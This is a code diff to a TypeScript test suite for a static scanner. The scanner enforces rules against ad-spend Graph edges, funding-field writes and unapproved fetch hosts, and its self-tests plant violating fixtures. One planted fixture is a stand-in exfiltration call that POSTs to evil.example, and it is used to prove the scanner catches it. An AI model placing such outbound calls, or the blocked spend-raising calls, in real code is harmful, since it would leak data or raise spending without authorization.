@@ -21,6 +21,11 @@ type Rule = {
   scope?: (rel: string) => boolean;
   find: (code: string, rel: string) => Hit[];
   allow: Allow;
+  /**
+   * Narrower than `allow`: in the named file, a hit is allowed only when the text at the hit matches `only` (tested at the hit's
+   * position, so a lookbehind sees what comes before it). Any other hit in that file still fails.
+   */
+  allowHits?: Readonly<Record<string, { only: RegExp; reason: string }>>;
 };
 type SourceFile = { rel: string; code: string };
 type Violation = { rule: string; file: string; line: number; text: string };
@@ -173,6 +178,10 @@ const FETCH_FILES: Readonly<Record<string, { reason: string; hosts?: string[] }>
   "components/site/auth-ui.tsx": { reason: "Same-origin /api/auth form posts." },
   "components/eddy/MessageView.tsx": { reason: "Same-origin /api/actions undo, with an injectable fetcher for tests." },
   "components/eddy/PreviewCard.tsx": { reason: "Same-origin /api/actions confirm, revise and cancel, with an injectable fetcher for tests." },
+  "lib/promote/media.ts": {
+    reason: "Ad media: only the bytes of the resumable video upload go to rupload.facebook.com, and only when PROMOTE_VIDEO=resumable (IG-PAGE-ADS-SPEC P0-9); its Graph calls use the transport.",
+    hosts: ["rupload.facebook.com"],
+  },
 };
 
 const FETCH_CALL = /(?<![\w.$])fetch\s*\(\s*/g;
@@ -363,6 +372,13 @@ export const RULES: Rule[] = [
     title: "funding_source is never written (R9: Edwyz never holds ad money)",
     find: matchAll(/funding_source/),
     allow: {},
+    allowHits: {
+      "lib/promote/meta.ts": {
+        // Exactly the field-list item, bounded by a quote or a comma on both sides: no other subfield, no body key, no other text.
+        only: /(?<=["'`,])funding_source_details\{type\}(?=["'`,])/,
+        reason: "The ad account readiness GET reads the field list funding_source_details{type} (C4, P0-4); only fundingPresent is stored.",
+      },
+    },
   },
   {
     id: "B12",
@@ -384,7 +400,21 @@ export const RULES: Rule[] = [
     find: (code) => [...matchAll(/\borigin\s*:\s*["']human["']/)(code), ...matchAll(/\btype\s*:\s*["']user["']/)(code)],
     allow: { "lib/actions/invoke.ts": "The one executor: builds {type:'user', reasonCodes:['via_eddy']} from the refreshed principal." },
   },
+  {
+    id: "B15",
+    title: "edges and fields that raise spend outside reserveAds are named only by the classifier (IG-PAGE-ADS-SPEC 4.7, D25)",
+    // A Graph batch is named by its items' `relative_url`; the minimum spend targets are never written (D25).
+    find: matchAll(/budget_schedules|asyncadrequestsets|creative_test_config|(?:daily|lifetime)_min_spend_target|\brelative_url\b|\/copies\b/),
+    allow: { "lib/spend/classify.ts": "The tripwire's classifier names them only to refuse them (ads_raise_or_unknown, never covered by a permit)." },
+  },
 ];
+
+/** True when `only` matches the code starting exactly at `index` (a sticky match; lookbehinds see the text before it). */
+function allowedHit(only: RegExp, code: string, index: number): boolean {
+  const re = new RegExp(only.source, only.flags.replace(/[gy]/g, "") + "y");
+  re.lastIndex = index;
+  return re.test(code);
+}
 
 export function scan(files: SourceFile[], rules: Rule[] = RULES): Violation[] {
   const out: Violation[] = [];
@@ -392,7 +422,11 @@ export function scan(files: SourceFile[], rules: Rule[] = RULES): Violation[] {
     for (const f of files) {
       if (rule.scope && !rule.scope(f.rel)) continue;
       if (isAllowed(rule.allow, f.rel)) continue;
-      for (const hit of rule.find(f.code, f.rel)) out.push({ rule: rule.id, file: f.rel, line: lineOf(f.code, hit.index), text: hit.text.trim().slice(0, 80) });
+      const narrow = rule.allowHits?.[f.rel];
+      for (const hit of rule.find(f.code, f.rel)) {
+        if (narrow && allowedHit(narrow.only, f.code, hit.index)) continue;
+        out.push({ rule: rule.id, file: f.rel, line: lineOf(f.code, hit.index), text: hit.text.trim().slice(0, 80) });
+      }
     }
   }
   return out;
@@ -425,6 +459,54 @@ describe("static bypass rules on the current tree (4.12)", () => {
       }
     }
     for (const [file, entry] of Object.entries(FETCH_FILES)) expect(entry.reason, file).toMatch(/^[A-Za-z].{8,}\.$/);
+    for (const rule of RULES) {
+      for (const [file, entry] of Object.entries(rule.allowHits ?? {})) {
+        expect(entry.reason, `${rule.id} ${file}`).toMatch(/^[A-Za-z@(].{8,}\.$/);
+        expect(entry.reason.includes("\n"), `${rule.id} ${file}`).toBe(false);
+      }
+    }
+  });
+
+  it("B15 allows only the classifier; B11 allows only the read field list, only in lib/promote/meta.ts (IG-PAGE-ADS-SPEC P0-3, P0-4)", () => {
+    const b15 = RULES.find((r) => r.id === "B15")!;
+    expect(Object.keys(b15.allow)).toEqual(["lib/spend/classify.ts"]);
+    expect(b15.allowHits).toBeUndefined();
+    for (const banned of ["${id}/budget_schedules", "act_1/asyncadrequestsets", "creative_test_config", "daily_min_spend_target", "lifetime_min_spend_target", "relative_url", "${id}/copies"]) {
+      expect(b15.find(`const x = "${banned}";`, "lib/x.ts"), banned).toHaveLength(1);
+    }
+    expect(b15.find("const body = { adset_spec: { daily_min_spend_target: 1 } };", "lib/x.ts")).toHaveLength(1);
+    expect(b15.find('const q = { "x[lifetime_min_spend_target]": "1" };', "lib/x.ts")).toHaveLength(1);
+    // A word that only contains "copies" is not a Graph edge, and a plain spend field or "batch" is left to other rules.
+    expect(b15.find('const t = "Make copies of your draft";', "lib/x.ts")).toHaveLength(0);
+    expect(b15.find("const b = { daily_budget: 1, min_spend: 2, batch: [] };", "lib/x.ts")).toHaveLength(0);
+
+    const b11 = RULES.find((r) => r.id === "B11")!;
+    expect(b11.allow).toEqual({});
+    expect(Object.keys(b11.allowHits ?? {})).toEqual(["lib/promote/meta.ts"]);
+    const only = b11.allowHits!["lib/promote/meta.ts"].only;
+    const at = (code: string) => allowedHit(only, code, code.indexOf("funding_source"));
+    expect(at('const f = "account_status,funding_source_details{type}";')).toBe(true);
+    expect(at('const f = "funding_source_details{type},currency";')).toBe(true);
+    expect(at("const f = ['funding_source_details{type}'];")).toBe(true);
+    expect(at('const f = "funding_source_details{type,id}";')).toBe(false);
+    expect(at('const f = "funding_source_details{display_string}";')).toBe(false);
+    expect(at('const f = "funding_source";')).toBe(false);
+    expect(at("const body = { funding_source: id };")).toBe(false);
+    expect(at('const f = "xfunding_source_details{type}";')).toBe(false);
+  });
+
+  it("B12 lets lib/promote/media.ts, and no other file, reach rupload.facebook.com (P0-9)", () => {
+    expect(FETCH_FILES["lib/promote/media.ts"]?.hosts).toEqual(["rupload.facebook.com"]);
+    expect(ALLOWED_HOSTS).not.toContain("rupload.facebook.com");
+    for (const [file, entry] of Object.entries(FETCH_FILES)) if (file !== "lib/promote/media.ts") expect(entry.hosts ?? [], file).not.toContain("rupload.facebook.com");
+  });
+
+  it("B3 and B10 stay unchanged: nothing under lib/promote may call adsClient( or name a budget or end field (6.1 rule 1)", () => {
+    for (const id of ["B3", "B10"]) {
+      const rule = RULES.find((r) => r.id === id)!;
+      expect(Object.keys(rule.allow).filter((k) => k.startsWith("lib/promote")), id).toEqual([]);
+      expect(rule.allowHits, id).toBeUndefined();
+    }
   });
 
   it("B2 allows only the AI gateway: WP-13 moved the three legacy callers behind it and removed their temporary entries", () => {
@@ -524,6 +606,41 @@ describe("self-test: a planted fixture fails the scan", () => {
   plant("lib/eddy/sneaky.ts", 'export type X = { a: 1 };\nimport Anthropic from "@anthropic-ai/sdk";\nexport const y = Anthropic;\n');
   plant("lib/ai-agent/generate.ts", 'export const old = () => fetch("https://api.anthropic.com/v1/messages", { method: "POST" });\n');
   plant("lib/inbox/unmetered.ts", 'import { anthropicMessagesHeldByCaller } from "@/lib/spend/exec/ai";\nexport const go = () => anthropicMessagesHeldByCaller({}, 1000);\n');
+  // IG-PAGE-ADS-SPEC P0-3, P0-4 and P0-9 (rules B15, B11 and B12).
+  plant(
+    "lib/planted/banned-edges.ts",
+    [
+      'import { graphFetchAs } from "@/lib/graph";',
+      "export const a = (t: string, id: string) => graphFetchAs(t, { path: `${id}/budget_schedules`, method: \"POST\", body: { budget_value: 100 } });",
+      "export const b = (t: string, id: string) => graphFetchAs(t, { path: id + \"/copies\", method: \"POST\" });",
+      'export const c = (t: string) => graphFetchAs(t, { path: "act_1/asyncadrequestsets", method: "POST" });',
+      "export const d = { creative_test_config: { test_budget: 1 } };",
+      "export const e = (t: string, id: string) => graphFetchAs(t, { path: id, method: \"POST\", body: { daily_min_spend_target: 5000 } });",
+      'export const f = (t: string, id: string) => graphFetchAs(t, { path: id, method: "POST", query: { "x[lifetime_min_spend_target]": "1" } });',
+      'export const g = (t: string, id: string) => graphFetchAs(t, { path: "/", method: "POST", body: { batch: [{ method: "POST", relative_url: id }] } });',
+      "",
+    ].join("\n"),
+  );
+  plant(
+    "lib/promote/meta.ts",
+    [
+      'export const READINESS_FIELDS = "account_status,currency,funding_source_details{type}";',
+      "export const write = (id: string) => ({ path: `act_${id}`, body: { funding_source: id } });",
+      'export const more = "funding_source_details{type,display_string}";',
+      "",
+    ].join("\n"),
+  );
+  plant("lib/planted/funding.ts", 'export const F = "id,funding_source_details{type}";\n');
+  plant(
+    "lib/promote/media.ts",
+    [
+      "export const RUPLOAD = 'https://rupload.facebook.com/video-upload/v26.0/';",
+      "export const put = (id: string, bytes: Uint8Array) => fetch(RUPLOAD + id, { method: 'POST', body: bytes });",
+      "export const leak = () => fetch('https://evil.example/upload', { method: 'POST' });",
+      "",
+    ].join("\n"),
+  );
+  plant("lib/planted/rupload.ts", "export const up = (b: Uint8Array) => fetch('https://rupload.facebook.com/video-upload', { method: 'POST', body: b });\n");
 
   it("fails on the planted fixture, naming each broken rule and file", () => {
     const violations = scan(loadSources(root));
@@ -545,5 +662,22 @@ describe("self-test: a planted fixture fails the scan", () => {
     );
     expect(got.some((g) => g.endsWith("commented.ts"))).toBe(false);
     expect(violations.find((v) => v.rule === "B2")?.line).toBe(1);
+  });
+
+  it("fails on planted B15, B11 and B12 violations, naming the rule, the file and the line", () => {
+    const violations = scan(loadSources(root));
+    const lines = (rule: string, file: string) => violations.filter((v) => v.rule === rule && v.file === file).map((v) => v.line);
+    // B15: every banned name, one per line, outside the classifier.
+    expect(lines("B15", "lib/planted/banned-edges.ts")).toEqual([2, 3, 4, 5, 6, 7, 8]);
+    // B11: the read field list in lib/promote/meta.ts passes; a body key and another subfield list do not.
+    expect(lines("B11", "lib/promote/meta.ts")).toEqual([2, 3]);
+    // B11: the same field list in any other file fails.
+    expect(lines("B11", "lib/planted/funding.ts")).toEqual([1]);
+    // B12: lib/promote/media.ts may reach rupload.facebook.com, but no other host.
+    expect(new Set(lines("B12", "lib/promote/media.ts"))).toEqual(new Set([3]));
+    // B12: no other file may reach rupload.facebook.com.
+    expect(new Set(lines("B12", "lib/planted/rupload.ts"))).toEqual(new Set([1]));
+    const named = violations.map((v) => `${v.rule}:${v.file}`);
+    expect(named).toEqual(expect.arrayContaining(["B15:lib/planted/banned-edges.ts", "B11:lib/promote/meta.ts", "B11:lib/planted/funding.ts", "B12:lib/promote/media.ts", "B12:lib/planted/rupload.ts"]));
   });
 });
